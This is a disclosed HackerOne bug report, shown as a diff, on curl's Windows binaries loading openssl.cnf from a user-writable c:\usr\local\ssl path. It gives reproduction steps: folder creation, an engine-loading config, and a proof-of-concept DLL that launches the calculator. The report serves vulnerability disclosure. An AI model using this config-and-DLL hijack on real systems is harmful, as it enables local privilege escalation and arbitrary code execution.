@@ -1,0 +1,93 @@
+ReportLink:https://hackerone.com/reports/608577
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/mirchr
+ReportedTo:curl(curl)
+BountyAmount:200.0
+Severity:high
+State:Closed
+DateOfDisclosure:29.06.2019 18:24:27
+
+Summary:
+
+## Summary:
+The curl windows binaries are built with OpenSSL libraries and have an insecure path for the OPENSSLDIR build parameter. This path is set to c:\usr\local\ssl. When curl is executed it attempts to load openssl.cnf from this path. By default on windows, low privileged users have the authority to create folders under c:\. A low privileged user can create a custom openssl.cnf file to load a malicious OpenSSL Engine(library). The result is arbitrary code execution with the full authority of the account executing the curl binary.
+
+
+Version tested.
+curl-7.65.1_1-win64
+
+OS:
+Windows 10 
+
+## Steps To Reproduce:
+All steps are executed as a low privileged(non-admin) user unless otherwise noted
+
+ 1. As a low privileged user create the following folder c:\usr\local\ssl
+```
+mkdir c:\usr
+mkdir c:\usr\local
+mkdir c:\usr\local\ssl
+```
+
+ 2. Create an openssl.cnf file with the following contents.
+
+```
+openssl_conf = openssl_init
+[openssl_init]
+engines = engine_section
+[engine_section]
+woot = woot_section
+[woot_section]
+engine_id = woot
+dynamic_path = c:\\stage\\calc.dll
+init = 0
+```
+
+ 3. Create the c:\stage folder
+```
+mkdir c:\stage
+````
+
+ 4. Create and compile a malicious OpenSSL Engine library. For this PoC we will execute the Windows calculator.
+````
+/* Cross Compile with
+   x86_64-w64-mingw32-g++ calc.c -o calc.dll -shared
+*/
+#include <windows.h>
+BOOL WINAPI DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved )
+{
+    switch( fdwReason )
+    {
+        case DLL_PROCESS_ATTACH:
+            system("calc");
+            break;
+        case DLL_THREAD_ATTACH:
+         // Do thread-specific initialization.
+            break;
+        case DLL_THREAD_DETACH:
+         // Do thread-specific cleanup.
+            break;
+        case DLL_PROCESS_DETACH:
+         // Perform any necessary cleanup.
+            break;
+    }
+    return TRUE;  // Successful DLL_PROCESS_ATTACH.
+}
+```
+
+ 5. Copy calc.dll to c:\stage
+`
+copy calc.dll c:\stage
+`
+ 6. Execute curl.exe as a different user.
+
+## Supporting Material/References:
+  * PoC image showing curl loading a custom calc.dll and executing calc.exe
+{F507228}
+
+## Impact
+
+A malicious local user(or potentially malware) with access to a Windows workstation or server with curl installed has the ability to silently plant a custom OpenSSL Engine library that contains arbitrary code. Every time curl is executed this library will be loaded and the code executed with the full authority of the account executing it resulting in the elevation of privileges.
